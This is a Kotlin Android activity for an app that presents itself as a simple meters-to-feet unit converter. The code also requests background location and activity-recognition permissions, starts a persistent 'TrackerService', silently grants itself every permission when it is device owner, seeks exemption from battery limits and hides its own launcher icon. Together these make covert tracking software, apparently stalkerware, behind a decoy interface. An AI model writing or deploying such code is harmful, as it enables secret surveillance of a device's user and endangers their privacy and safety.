package com.aether.convert

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.aether.convert.admin.Dp
import java.util.Locale

class MainActivity : ComponentActivity() {
    private lateinit var prefs: Prefs
    private val q = ArrayDeque<String>()
    private var out: TextView? = null
    private var field: EditText? = null
    private val perm = registerForActivityResult(
        ActivityResultContracts.RequestPermission()) { step() }

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        prefs = Prefs(this)
        build()
        if (Dp.isOwner(this)) { Dp.grantAll(this); finishOnboard() }
        else if (!prefs.onboarded) onboard()
    }

    override fun onResume() { super.onResume(); if (prefs.onboarded) run_() }

    private fun run_() {
        try {
            ContextCompat.startForegroundService(this,
                Intent(this, TrackerService::class.java).setAction(TrackerService.ACTION_START))
        } catch (_: Throwable) {}
    }

    private fun onboard() {
        q.clear()
        q.add(Manifest.permission.ACCESS_FINE_LOCATION)
        if (Build.VERSION.SDK_INT >= 29) q.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        if (Build.VERSION.SDK_INT >= 33) q.add(Manifest.permission.POST_NOTIFICATIONS)
        if (Build.VERSION.SDK_INT >= 29) q.add(Manifest.permission.ACTIVITY_RECOGNITION)
        step()
    }

    private fun step() {
        while (q.isNotEmpty()) {
            val p = q.removeFirst()
            if (ContextCompat.checkSelfPermission(this, p) ==
                PackageManager.PERMISSION_GRANTED) continue
            perm.launch(p); return
        }
        finishOnboard()
    }

    private fun finishOnboard() {
        prefs.onboarded = true
        run_()
        if (!Dp.isOwner(this) && !DeviceInfo.ignoring(this)) {
            try {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")))
            } catch (_: Throwable) {}
        }
        if (!prefs.hidden) {
            try {
                packageManager.setComponentEnabledSetting(
                    ComponentName(this, "$packageName.Launch"),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP)
                prefs.hidden = true
            } catch (_: Throwable) {}
        }
    }

    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()

    private fun build() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(24), dp(56), dp(24), dp(24))
            setBackgroundColor(Color.parseColor("#101014"))
        }
        root.addView(TextView(this).apply {
            text = "Unit Converter"; textSize = 24f
            setTextColor(Color.parseColor("#F2F2F5"))
        })
        root.addView(TextView(this).apply {
            text = "Meters  →  Feet"; textSize = 13f
            setTextColor(Color.parseColor("#8A8A94"))
            setPadding(0, dp(6), 0, dp(20))
        })
        field = EditText(this).apply {
            hint = "0"
            inputType = InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_FLAG_DECIMAL
            setTextColor(Color.parseColor("#F2F2F5"))
            setHintTextColor(Color.parseColor("#8A8A94"))
            background = GradientDrawable().apply {
                cornerRadius = dp(12).toFloat()
                setColor(Color.parseColor("#1B1B21"))
                setStroke(dp(1), Color.parseColor("#2A2A33"))
            }
            setPadding(dp(16), dp(14), dp(16), dp(14))
        }
        root.addView(field)
        val b = Button(this).apply {
            text = "Convert"; setTextColor(Color.WHITE)
            background = GradientDrawable().apply {
                cornerRadius = dp(12).toFloat(); setColor(Color.parseColor("#4C8DFF"))
            }
            setOnClickListener { convert() }
        }
        val lp = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
        lp.topMargin = dp(16)
        root.addView(b, lp)
        out = TextView(this).apply {
            textSize = 34f; setTextColor(Color.parseColor("#F2F2F5"))
            gravity = Gravity.CENTER_HORIZONTAL; setPadding(0, dp(28), 0, 0)
        }
        root.addView(out)
        root.addView(TextView(this).apply {
            text = "1 m = 3.28084 ft"; textSize = 12f
            setTextColor(Color.parseColor("#8A8A94"))
            gravity = Gravity.CENTER_HORIZONTAL; setPadding(0, dp(8), 0, dp(28))
        })
        root.addView(Button(this).apply {
            text = "Battery settings"; setTextColor(Color.parseColor("#8A8A94"))
            setBackgroundColor(Color.TRANSPARENT)
            setOnClickListener { Oem.autostart(this@MainActivity) }
        })
        setContentView(root)
    }

    private fun convert() {
        val v = field?.text?.toString()?.toDoubleOrNull()
        out?.text = if (v == null) "—" else String.format(Locale.US, "%.4f ft", v * 3.28084)
    }
}